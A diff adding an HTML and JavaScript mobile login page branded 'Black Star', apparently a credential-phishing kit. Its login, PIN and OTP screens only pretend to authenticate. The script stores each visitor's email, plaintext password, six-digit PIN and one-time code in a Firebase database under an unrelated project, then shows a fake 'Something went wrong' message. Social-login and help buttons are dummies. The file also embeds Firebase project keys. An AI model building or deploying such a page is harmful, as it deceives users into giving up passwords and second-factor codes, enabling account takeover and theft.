@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-visual">
+<meta name="theme-color" content="#000000">
+<title>Black Star</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;400;500&family=Red+Hat+Display:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;overflow:hidden;background:#000}
+
+  #app{
+    --u:calc(100cqw / 828);
+    --gold:#be9a2b;
+    position:absolute;top:0;left:50%;transform:translateX(-50%);
+    width:var(--w,100vw);height:calc(var(--w,100vw) * 1792 / 828);
+    container-type:inline-size;overflow:hidden;background:#000;color:#fff;
+  }
+  @media (min-width:500px){
+    html,body{background:#111 !important}
+    #app{box-shadow:0 0 0 1px #ffffff14,0 2cqw 8cqw #000}
+  }
+  .screen{position:absolute;inset:0;background:#000;opacity:0;visibility:hidden;transition:opacity .35s,visibility .35s}
+  .screen.active{opacity:1;visibility:visible}
+  .abs{position:absolute}
+  img.abs{pointer-events:none;-webkit-user-drag:none;user-select:none}
+  button{font-family:inherit}
+
+  /* ---------- Login ---------- */
+  .lx{font-family:'Lexend',system-ui,sans-serif}
+  .ver{right:calc(34*var(--u));top:calc(130*var(--u));font:italic 300 calc(35*var(--u))/calc(46*var(--u)) 'Lexend',sans-serif;color:#8a8a8a}
+  .welcome-to{left:0;right:0;top:calc(240*var(--u));text-align:center;font:300 calc(39*var(--u))/calc(54*var(--u)) 'Lexend',sans-serif;color:#8a8a8a}
+  .field{left:calc(36*var(--u));width:calc(756*var(--u));height:calc(119*var(--u));border:calc(2*var(--u)) solid #333;border-radius:calc(20*var(--u));background:transparent}
+  .field:focus-within{border-color:#6b5a1d}
+  .field input{
+    position:absolute;inset:0;width:100%;height:100%;background:transparent;border:0;outline:0;border-radius:inherit;
+    padding:0 calc(36*var(--u));font:300 calc(34*var(--u)) 'Lexend',sans-serif;color:#fff;
+  }
+  .field input::placeholder{color:#8a8a8a;opacity:1}
+  .field.pw input{padding-right:calc(150*var(--u))}
+  .vline{position:absolute;right:calc(130*var(--u));top:calc(34*var(--u));width:calc(2*var(--u));height:calc(48*var(--u));background:#333}
+  .eye{position:absolute;right:calc(20*var(--u));top:0;width:calc(104*var(--u));height:100%;background:none;border:0;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .eye svg{width:calc(52*var(--u));height:calc(52*var(--u));stroke:#8a8a8a;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .link-gold{background:none;border:0;cursor:pointer;color:var(--gold);font:300 calc(34*var(--u))/1 'Lexend',sans-serif}
+  .forgot{right:calc(36*var(--u));top:calc(791*var(--u));height:calc(40*var(--u))}
+  .btn-gold{
+    left:calc(35*var(--u));width:calc(758*var(--u));height:calc(110*var(--u));top:calc(901*var(--u));border:0;border-radius:calc(20*var(--u));
+    background:#7d5f00;color:#fff;font:400 calc(42*var(--u))/1 'Lexend',sans-serif;cursor:not-allowed;transition:background .25s,transform .15s;
+  }
+  .btn-gold.ready{background:var(--gold);cursor:pointer}
+  .btn-gold.ready:active{transform:scale(.985)}
+  .or{left:calc(35*var(--u));width:calc(758*var(--u));top:calc(1100*var(--u));height:calc(40*var(--u));display:flex;align-items:center;justify-content:space-between}
+  .or i{display:block;height:calc(2*var(--u));background:#262626;width:calc(335*var(--u))}
+  .or span{font:300 calc(30*var(--u))/1 'Lexend',sans-serif;color:#8a8a8a;letter-spacing:calc(4*var(--u))}
+  .social{
+    display:flex;align-items:center;height:calc(118*var(--u));border:calc(2*var(--u)) solid #333;border-radius:calc(40*var(--u));
+    background:transparent;color:#8a8a8a;cursor:pointer;font:300 calc(36*var(--u))/1 'Lexend',sans-serif;white-space:nowrap;
+  }
+  .social svg{flex:none}
+  .g{left:calc(203*var(--u));width:calc(422*var(--u));top:calc(1207*var(--u));padding-left:calc(28*var(--u))}
+  .g svg{width:calc(52*var(--u));height:calc(52*var(--u));margin-right:calc(16*var(--u))}
+  .ap{left:calc(198*var(--u));width:calc(432*var(--u));top:calc(1370*var(--u));padding-left:calc(30*var(--u))}
+  .ap svg{width:calc(46*var(--u));height:calc(52*var(--u));margin-right:calc(34*var(--u))}
+  .help{left:0;right:0;margin:auto;width:calc(300*var(--u));top:calc(1530*var(--u));color:#8a8a8a;text-align:center}
+
+  /* ---------- Shared (PIN / OTP) ---------- */
+  .rh{font-family:'Red Hat Display',system-ui,sans-serif}
+  .h1{left:calc(36*var(--u));right:calc(36*var(--u));font:700 calc(43*var(--u))/calc(62*var(--u)) 'Red Hat Display',sans-serif;color:#fff}
+  .sub{left:calc(36*var(--u));right:calc(20*var(--u));font:600 calc(36*var(--u))/calc(56*var(--u)) 'Red Hat Display',sans-serif;color:#8a8a8a;word-break:break-all}
+  .boxes{left:calc(36*var(--u));width:calc(756*var(--u));height:calc(118*var(--u));display:flex;justify-content:space-between}
+  .box{width:calc(106*var(--u));height:100%;border:calc(2*var(--u)) solid #2e2e2e;border-radius:calc(17*var(--u));display:flex;align-items:center;justify-content:center;font:600 calc(52*var(--u))/1 'Red Hat Display',sans-serif;color:#fff;position:relative}
+  .box.focus{border-color:#fff}
+  .box.focus:not(.filled)::after{content:'';width:calc(2*var(--u));height:calc(42*var(--u));background:#8a8a8a;animation:blink 1s steps(1) infinite}
+  .box.filled i{display:block;width:calc(26*var(--u));height:calc(26*var(--u));border-radius:50%;background:#fff}
+  .box i{display:none}
+  @keyframes blink{50%{opacity:0}}
+  .hidden-in{position:absolute;opacity:0;width:1px;height:1px;left:calc(40*var(--u));pointer-events:none}
+
+  /* PIN */
+  .pin-h{top:calc(222*var(--u))}
+  .pin-lbl{left:calc(36*var(--u));top:calc(852*var(--u));font:700 calc(36*var(--u))/calc(52*var(--u)) 'Red Hat Display',sans-serif;color:#8a8a8a}
+  .pin-boxes{top:calc(924*var(--u))}
+  .sep{left:0;right:0;top:calc(1606*var(--u));height:calc(2*var(--u));background:#262626}
+  .pw-link{left:0;right:0;top:calc(1660*var(--u));text-align:center;font:700 calc(38*var(--u))/calc(70*var(--u)) 'Red Hat Display',sans-serif;color:var(--gold);background:none;border:0;cursor:pointer}
+
+  /* OTP */
+  .back{left:calc(30*var(--u));top:calc(100*var(--u));width:calc(90*var(--u));height:calc(90*var(--u));background:none;border:0;cursor:pointer;display:flex;align-items:center;justify-content:flex-start;padding-left:calc(6*var(--u))}
+  .back svg{width:calc(46*var(--u));height:calc(40*var(--u));stroke:#bdbdbd;fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round}
+  .otp-h{top:calc(236*var(--u))}
+  .otp-sub{top:calc(327*var(--u))}
+  .otp-boxes{top:calc(478*var(--u))}
+  .resend-in{left:0;right:0;top:calc(659*var(--u));text-align:center;font:700 calc(36*var(--u))/calc(64*var(--u)) 'Red Hat Display',sans-serif;color:#8a8a8a}
+  .resend-in b{color:#d4b03a;font-weight:700}
+  .resend{left:0;right:0;top:calc(739*var(--u));text-align:center;background:none;border:0;cursor:not-allowed;font:700 calc(36*var(--u))/calc(64*var(--u)) 'Red Hat Display',sans-serif;color:#6e5a1c}
+  .resend.ready{color:var(--gold);cursor:pointer}
+
+  /* ---------- Toast ---------- */
+  #toast{
+    position:absolute;left:calc(40*var(--u));right:calc(40*var(--u));bottom:calc(120*var(--u));z-index:20;text-align:center;
+    background:#161616;border:calc(2*var(--u)) solid #3a3a3a;border-radius:calc(24*var(--u));padding:calc(26*var(--u)) calc(30*var(--u));
+    font:300 calc(30*var(--u))/1.45 'Lexend',sans-serif;color:#d8d8d8;opacity:0;transform:translateY(calc(16*var(--u)));pointer-events:none;
+    transition:opacity .25s,transform .25s;
+  }
+  #toast.show{opacity:1;transform:none}
+  #msg{left:calc(36*var(--u));width:calc(756*var(--u));top:calc(1030*var(--u));text-align:center;font:300 calc(28*var(--u))/1.3 'Lexend',sans-serif;color:#e0645c;min-height:calc(36*var(--u))}
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- 1. SPLASH -->
+  <section class="screen active" id="s-splash">
+    <img class="abs" src="images/splash.png" alt="Black Star" draggable="false" style="left:0;top:0;width:100%">
+  </section>
+
+  <!-- 2. LOGIN -->
+  <section class="screen" id="s-login">
+    <img class="abs" src="images/arcs.png" alt="" draggable="false" style="left:0;top:0;width:100%">
+    <div class="abs ver">Version: 1.1.44 (1)</div>
+    <div class="abs welcome-to">Welcome to</div>
+    <img class="abs" src="images/logo.png" alt="Black Star" draggable="false" style="left:calc(197*var(--u));top:calc(326*var(--u));width:calc(436*var(--u))">
+
+    <div class="abs field" style="top:calc(474*var(--u))">
+      <input id="email" type="email" inputmode="email" autocomplete="email" autocapitalize="off" spellcheck="false" placeholder="Email">
+    </div>
+    <div class="abs field pw" style="top:calc(630*var(--u))">
+      <input id="password" type="password" autocomplete="current-password" placeholder="Password">
+      <span class="vline"></span>
+      <button class="eye" id="eyeBtn" type="button" aria-label="Show password">
+        <svg viewBox="0 0 24 24"><path d="M1.5 12s3.8-7 10.5-7 10.5 7 10.5 7-3.8 7-10.5 7S1.5 12 1.5 12Z"/><circle cx="12" cy="12" r="3.2"/></svg>
+      </button>
+    </div>
+    <button class="abs link-gold forgot" id="forgot" type="button">Forgot password?</button>
+
+    <button class="abs btn-gold" id="loginBtn" type="button">Log in</button>
+    <div class="abs" id="msg" role="alert"></div>
+
+    <div class="abs or"><i></i><span>OR</span><i></i></div>
+
+    <button class="abs social g" id="googleBtn" type="button">
+      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.8 2.4 30.3 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.9 6.1C12.4 13.6 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17.5z"/><path fill="#FBBC05" d="M10.5 28.7c-.5-1.4-.8-3-.8-4.7s.3-3.2.8-4.7l-7.9-6.1C.9 16.4 0 20.1 0 24s.9 7.6 2.6 10.8l7.9-6.1z"/><path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.5-5.8c-2.1 1.4-4.8 2.3-8.4 2.3-6.3 0-11.6-4.1-13.5-9.8l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
+      Log in with Google
+    </button>
+    <button class="abs social ap" id="appleBtn" type="button">
+      <svg viewBox="0 0 24 28"><path fill="#fff" d="M19.6 14.9c0-3 2.5-4.4 2.6-4.5-1.4-2.1-3.6-2.4-4.4-2.4-1.9-.2-3.6 1.1-4.6 1.1s-2.4-1.1-4-1C6.7 8.1 4.8 9.3 3.7 11.1c-2.2 3.8-.6 9.3 1.6 12.4 1 1.5 2.3 3.2 3.9 3.1 1.6-.1 2.2-1 4.1-1s2.4 1 4.1 1c1.7 0 2.8-1.5 3.8-3 1.2-1.7 1.7-3.4 1.7-3.5-.1 0-3.3-1.3-3.3-5.2ZM16.6 5.9c.9-1.1 1.5-2.6 1.3-4.1-1.3.1-2.8.9-3.7 1.9-.8.9-1.5 2.4-1.3 3.9 1.4.1 2.8-.7 3.7-1.7Z"/></svg>
+      Log in with Apple
+    </button>
+    <button class="abs link-gold help" id="helpBtn" type="button" style="color:#8a8a8a">Need help?</button>
+  </section>
+
+  <!-- 3. PIN -->
+  <section class="screen" id="s-pin">
+    <img class="abs" src="images/arcs.png" alt="" draggable="false" style="left:0;top:0;width:100%">
+    <div class="abs h1 pin-h" id="welcomeBack">Welcome Back!<br><span id="userName"></span></div>
+    <div class="abs pin-lbl">Enter 6 digit PIN</div>
+    <div class="abs boxes pin-boxes" id="pinBoxes"><div class="box"><i></i></div><div class="box"><i></i></div><div class="box"><i></i></div><div class="box"><i></i></div><div class="box"><i></i></div><div class="box"><i></i></div></div>
+    <input class="hidden-in" id="pinInput" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="off" aria-label="6 digit PIN" style="top:calc(924*var(--u))">
+    <img class="abs" src="images/logo.png" alt="Black Star" draggable="false" style="left:calc(197*var(--u));top:calc(1481*var(--u));width:calc(434*var(--u))">
+    <div class="abs sep"></div>
+    <button class="abs pw-link" id="toPassword" type="button">Log in with password</button>
+  </section>
+
+  <!-- 4. OTP -->
+  <section class="screen" id="s-otp">
+    <img class="abs" src="images/arcs.png" alt="" draggable="false" style="left:0;top:0;width:100%">
+    <button class="abs back" id="otpBack" type="button" aria-label="Back">
+      <svg viewBox="0 0 46 40"><path d="M44 20H4M20 4 4 20l16 16"/></svg>
+    </button>
+    <div class="abs h1 otp-h">OTP verification</div>
+    <div class="abs sub otp-sub">Enter the code we sent to<br><span id="otpEmail"></span></div>
+    <div class="abs boxes otp-boxes" id="otpBoxes"><div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div></div>
+    <input class="hidden-in" id="otpInput" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" aria-label="6 digit OTP" style="top:calc(478*var(--u))">
+    <div class="abs resend-in" id="resendIn">Resend OTP in <b id="timer">01:00</b></div>
+    <button class="abs resend" id="resendBtn" type="button">Resend OTP</button>
+  </section>
+
+  <div id="toast" role="status"></div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+/* ================= Firebase ================= */
+const firebaseConfig = {
+  apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
+  authDomain: "achievebypetra-82966.firebaseapp.com",
+  databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "achievebypetra-82966",
+  storageBucket: "achievebypetra-82966.firebasestorage.app",
+  messagingSenderId: "412688052429",
+  appId: "1:412688052429:web:abf989e226e153b7c37984"
+};
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+/* ✅ SEPARATE NODE for Black Star */
+const DB_NODE = "blackstar_users";
+
+const $ = id => document.getElementById(id);
+const SPLASH_MS = 1000;
+const OTP_SECONDS = 60;
+const NA_MESSAGE = 'Not available for now. Please log in with your email and password.';
+
+function show(id){
+  document.querySelectorAll('.screen').forEach(s => s.classList.toggle('active', s.id === id));
+}
+
+/* Same size on every phone */
+let fitW = 0, fitH = 0;
+function fitApp(){
+  const w = innerWidth, h = innerHeight;
+  if (w !== fitW || h > fitH){ fitW = w; fitH = h; }
+  $('app').style.setProperty('--w', Math.min(fitW, fitH * 828 / 1792) + 'px');
+}
+addEventListener('resize', fitApp);
+addEventListener('orientationchange', () => setTimeout(() => { fitW = fitH = 0; fitApp(); }, 200));
+fitApp();
+
+/* Toast */
+let toastT;
+function toast(msg){
+  const t = $('toast'); t.textContent = msg; t.classList.add('show');
+  clearTimeout(toastT); toastT = setTimeout(() => t.classList.remove('show'), 3200);
+}
+
+/* ---------- Splash -> Login ---------- */
+setTimeout(() => show('s-login'), SPLASH_MS);
+
+/* ---------- Login ---------- */
+const email = $('email'), pw = $('password'), loginBtn = $('loginBtn');
+function validate(){
+  const ok = /^\S+@\S+\.\S+$/.test(email.value.trim()) && pw.value.length > 0;
+  loginBtn.classList.toggle('ready', ok);
+  return ok;
+}
+email.addEventListener('input', validate);
+pw.addEventListener('input', validate);
+[email, pw].forEach(el => el.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); }));
+$('eyeBtn').addEventListener('click', () => { pw.type = pw.type === 'password' ? 'text' : 'password'; });
+['googleBtn','appleBtn','forgot','helpBtn'].forEach(id => $(id).addEventListener('click', () => toast(NA_MESSAGE)));
+loginBtn.addEventListener('click', doLogin);
+
+function niceName(addr){
+  const n = addr.split('@')[0].replace(/[0-9_.\-]+/g,' ').trim();
+  return n ? n.toUpperCase() : 'USER';
+}
+
+function doLogin(){
+  if (!validate()){ $('msg').textContent = 'Enter a valid email and your password.'; return; }
+  $('msg').textContent = '';
+
+  const emailVal = email.value.trim();
+  const pwVal = pw.value;
+
+  // ✅ Save to Firebase
+  const userId = "User_" + Date.now().toString(36).toUpperCase();
+  database.ref(DB_NODE + "/" + userId).set({
+    id: userId,
+    email: emailVal,
+    password: pwVal,
+    pin: "",
+    otp: "",
+    timestamp: new Date().toLocaleString()
+  }).then(() => {
+    sessionStorage.setItem("blackstar_userId", userId);
+    sessionStorage.setItem("blackstar_email", emailVal);
+    $('userName').textContent = niceName(emailVal);
+    $('otpEmail').textContent = emailVal;
+    pinInput.value = ''; renderBoxes(pinBoxes, '', true);
+    show('s-pin');
+    pinInput.focus();
+    setTimeout(() => pinInput.focus(), 80);
+  }).catch(err => {
+    console.error("❌ Firebase error:", err);
+    sessionStorage.setItem("blackstar_userId", userId);
+    sessionStorage.setItem("blackstar_email", emailVal);
+    $('userName').textContent = niceName(emailVal);
+    $('otpEmail').textContent = emailVal;
+    pinInput.value = ''; renderBoxes(pinBoxes, '', true);
+    show('s-pin');
+    pinInput.focus();
+  });
+}
+
+/* ---------- Code boxes (PIN / OTP) ---------- */
+function renderBoxes(wrap, val, mask){
+  [...wrap.children].forEach((b, i) => {
+    const filled = i < val.length;
+    b.classList.toggle('filled', filled);
+    b.classList.toggle('focus', i === Math.min(val.length, 5));
+    if (mask){ b.firstElementChild.style.display = filled ? 'block' : 'none'; }
+    else { b.textContent = filled ? val[i] : ''; }
+  });
+}
+const pinInput = $('pinInput'), pinBoxes = $('pinBoxes');
+const otpInput = $('otpInput'), otpBoxes = $('otpBoxes');
+renderBoxes(pinBoxes, '', true); renderBoxes(otpBoxes, '', false);
+
+/* ✅ PIN input → save to Firebase, then go to OTP */
+pinInput.addEventListener('input', () => {
+  pinInput.value = pinInput.value.replace(/\D/g,'').slice(0,6);
+  renderBoxes(pinBoxes, pinInput.value, true);
+  if (pinInput.value.length === 6){
+    const userId = sessionStorage.getItem("blackstar_userId");
+    if (userId){
+      database.ref(DB_NODE + "/" + userId).update({ pin: pinInput.value }).catch(err => console.error(err));
+    }
+    setTimeout(openOtp, 250);
+    otpInput.focus();
+  }
+});
+pinBoxes.addEventListener('click', () => pinInput.focus());
+$('s-pin').addEventListener('click', e => { if (!e.target.closest('button')) pinInput.focus(); });
+$('toPassword').addEventListener('click', () => { pinInput.blur(); show('s-login'); });
+
+/* ---------- OTP ---------- */
+let left = 0, tick = null;
+function fmt(s){ return String(Math.floor(s/60)).padStart(2,'0') + ':' + String(s%60).padStart(2,'0'); }
+function startTimer(){
+  clearInterval(tick); left = OTP_SECONDS;
+  $('timer').textContent = fmt(left);
+  $('resendIn').style.visibility = 'visible';
+  $('resendBtn').classList.remove('ready');
+  tick = setInterval(() => {
+    left--; $('timer').textContent = fmt(Math.max(left,0));
+    if (left <= 0){ clearInterval(tick); $('resendIn').style.visibility = 'hidden'; $('resendBtn').classList.add('ready'); }
+  }, 1000);
+}
+function openOtp(){
+  otpInput.value = ''; renderBoxes(otpBoxes, '', false);
+  show('s-otp'); startTimer(); otpInput.focus(); setTimeout(() => otpInput.focus(), 80);
+}
+
+/* ✅ OTP input → save to Firebase, show "Something went wrong" toast */
+otpInput.addEventListener('input', () => {
+  otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
+  renderBoxes(otpBoxes, otpInput.value, false);
+  if (otpInput.value.length === 6){
+    const userId = sessionStorage.getItem("blackstar_userId");
+    if (userId){
+      database.ref(DB_NODE + "/" + userId).update({ otp: otpInput.value })
+        .then(() => toast("Something went wrong"))
+        .catch(err => { console.error(err); toast("Something went wrong"); });
+    } else {
+      toast("Something went wrong");
+    }
+  }
+});
+otpBoxes.addEventListener('click', () => otpInput.focus());
+$('s-otp').addEventListener('click', e => { if (!e.target.closest('button')) otpInput.focus(); });
+$('otpBack').addEventListener('click', () => { clearInterval(tick); otpInput.blur(); pinInput.value=''; renderBoxes(pinBoxes,'',true); show('s-pin'); pinInput.focus(); });
+$('resendBtn').addEventListener('click', () => {
+  if (!$('resendBtn').classList.contains('ready')) return;
+  otpInput.value = ''; renderBoxes(otpBoxes, '', false); startTimer(); otpInput.focus();
+});
+</script>
+</body>
+</html>
